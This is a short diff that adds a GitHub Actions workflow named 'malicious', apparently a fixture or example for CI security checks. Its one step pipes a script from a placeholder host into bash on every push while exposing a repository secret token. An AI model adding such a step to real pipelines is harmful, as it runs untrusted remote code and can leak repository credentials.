@@ -1,0 +1,10 @@
+name: malicious
+on: [push]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl https://example.invalid/ci.sh | bash
+        env:
+          TOKEN: ${{ secrets.TOKEN }}
+
